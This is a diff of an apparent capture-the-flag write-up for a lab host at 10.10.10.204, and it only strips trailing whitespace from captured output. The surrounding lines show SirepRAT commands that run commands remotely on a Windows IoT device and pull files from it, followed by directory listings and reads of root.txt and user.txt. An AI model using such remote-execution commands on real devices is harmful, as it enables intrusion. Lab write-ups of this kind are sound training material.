@@ -139,15 +139,15 @@ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C
 python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\grace2.txt" --v
 # ---------
 #     Directory: C:\Data\Users\DefaultAccount
-# Mode                LastWriteTime         Length Name                          
-# ----                -------------         ------ ----                          
-# d-r---         7/3/2020  11:22 PM                3D Objects                    
-# d-r---         7/3/2020  11:22 PM                Documents                     
-# d-r---         7/3/2020  11:22 PM                Downloads                     
-# d-----         7/3/2020  11:22 PM                Favorites                     
-# d-r---         7/3/2020  11:22 PM                Music                         
-# d-r---         7/3/2020  11:22 PM                Pictures                      
-# d-r---         7/3/2020  11:22 PM                Videos                        
+# Mode                LastWriteTime         Length Name
+# ----                -------------         ------ ----
+# d-r---         7/3/2020  11:22 PM                3D Objects
+# d-r---         7/3/2020  11:22 PM                Documents
+# d-r---         7/3/2020  11:22 PM                Downloads
+# d-----         7/3/2020  11:22 PM                Favorites
+# d-r---         7/3/2020  11:22 PM                Music
+# d-r---         7/3/2020  11:22 PM                Pictures
+# d-r---         7/3/2020  11:22 PM                Videos
 # ---------
 
 
@@ -155,14 +155,14 @@ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C
 python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\grace2.txt" --v
 # ---------
 #     Directory: C:\Data\Users
-# Mode                LastWriteTime         Length Name                          
-# ----                -------------         ------ ----                          
-# d-----         7/4/2020   9:48 PM                administrator                 
-# d-----         7/4/2020   9:53 PM                app                           
-# d-----         7/3/2020  11:22 PM                DefaultAccount                
-# d-----         7/3/2020  11:22 PM                DevToolsUser                  
-# d-r---        8/21/2020   1:55 PM                Public                        
-# d-----         7/4/2020  10:29 PM                System                        
+# Mode                LastWriteTime         Length Name
+# ----                -------------         ------ ----
+# d-----         7/4/2020   9:48 PM                administrator
+# d-----         7/4/2020   9:53 PM                app
+# d-----         7/3/2020  11:22 PM                DefaultAccount
+# d-----         7/3/2020  11:22 PM                DevToolsUser
+# d-r---        8/21/2020   1:55 PM                Public
+# d-----         7/4/2020  10:29 PM                System
 # ---------
 
 
@@ -231,16 +231,16 @@ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C
 
 PS C:\Data\Users\administrator> ls
 #     Directory: C:\Data\Users\administrator
-# Mode                LastWriteTime         Length Name                          
-# ----                -------------         ------ ----                          
-# d-r---         7/3/2020  11:23 PM                3D Objects                    
-# d-r---         7/3/2020  11:23 PM                Documents                     
-# d-r---         7/3/2020  11:23 PM                Downloads                     
-# d-----         7/3/2020  11:23 PM                Favorites                     
-# d-r---         7/3/2020  11:23 PM                Music                         
-# d-r---         7/3/2020  11:23 PM                Pictures                      
-# d-r---         7/3/2020  11:23 PM                Videos                        
-# -ar---         7/4/2020   9:48 PM           1958 root.txt                      
+# Mode                LastWriteTime         Length Name
+# ----                -------------         ------ ----
+# d-r---         7/3/2020  11:23 PM                3D Objects
+# d-r---         7/3/2020  11:23 PM                Documents
+# d-r---         7/3/2020  11:23 PM                Downloads
+# d-----         7/3/2020  11:23 PM                Favorites
+# d-r---         7/3/2020  11:23 PM                Music
+# d-r---         7/3/2020  11:23 PM                Pictures
+# d-r---         7/3/2020  11:23 PM                Videos
+# -ar---         7/4/2020   9:48 PM           1958 root.txt
 
 
 
@@ -260,7 +260,7 @@ PS C:\Data\Users\administrator> cat root.txt
 # </Objs>
 
 
-PS C:\Data\Users\app> cat user.txt        
+PS C:\Data\Users\app> cat user.txt
 # <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
 #   <Obj RefId="0">
 #     <TN RefId="0">
